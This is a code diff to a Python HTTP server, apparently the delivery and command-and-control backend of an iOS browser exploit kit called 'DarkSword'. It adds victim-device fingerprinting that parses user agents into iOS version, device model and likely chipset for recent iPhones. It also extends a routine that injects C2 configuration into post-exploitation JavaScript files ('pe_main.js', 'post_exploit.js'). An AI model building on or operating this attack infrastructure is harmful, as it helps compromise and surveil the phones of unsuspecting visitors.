@@ -45,17 +45,62 @@ def save_log_to_db(log_type: str, ip: str, method: str = None, path: str = None,
         pass
 
 
+def parse_user_agent(user_agent: str):
+    os_version = None
+    safari_version = None
+    device_model = None
+    chipset = None
+    
+    if user_agent:
+        version_match = re.search(r'Version/([0-9.]+)', user_agent)
+        if version_match:
+            os_version = version_match.group(1)
+        
+        safari_match = re.search(r'Safari/([0-9.]+)', user_agent)
+        if safari_match:
+            safari_version = safari_match.group(1)
+        
+        if 'iPhone' in user_agent:
+            device_model = 'iPhone'
+        elif 'iPad' in user_agent:
+            device_model = 'iPad'
+        elif 'iPod' in user_agent:
+            device_model = 'iPod Touch'
+        
+        if os_version and device_model:
+            version_map = {
+                '18.7': 'A17 Pro / A18',
+                '18.6': 'A17 Pro / A18',
+                '18.5': 'A17 Pro / A18',
+                '18.4': 'A17 Pro / A18',
+            }
+            chipset = version_map.get(os_version)
+    
+    return os_version, safari_version, device_model, chipset
+
+
 def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
     if not DB_AVAILABLE:
         return
     try:
         db = SessionLocal()
         device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
+        
+        os_version, safari_version, device_model, chipset = parse_user_agent(user_agent)
+        
         if device:
             device.last_seen = datetime.now()
             device.ip = ip
             if user_agent:
                 device.user_agent = user_agent
+            if os_version and not device.os_version:
+                device.os_version = os_version
+            if safari_version and not device.safari_version:
+                device.safari_version = safari_version
+            if device_model and not device.device_model:
+                device.device_model = device_model
+            if chipset and not device.chipset:
+                device.chipset = chipset
         else:
             device = Device(
                 device_uuid=device_uuid,
@@ -63,7 +108,11 @@ def update_device_in_db(device_uuid: str, ip: str, user_agent: str = None):
                 last_seen=datetime.now(),
                 ip=ip,
                 user_agent=user_agent,
-                status="active"
+                status="active",
+                os_version=os_version,
+                safari_version=safari_version,
+                device_model=device_model,
+                chipset=chipset
             )
             db.add(device)
         db.commit()
@@ -193,7 +242,7 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
         return f"http://{host_header}"
 
     def _inject_c2_into_pe_main(self, content: bytes, path: Path) -> bytes:
-        if path.name != "pe_main.js" or b"__DS_C2" not in content:
+        if path.name not in ["pe_main.js", "post_exploit.js"] or b"__DS_C2" not in content:
             return content
         config = self.config
         if not config:
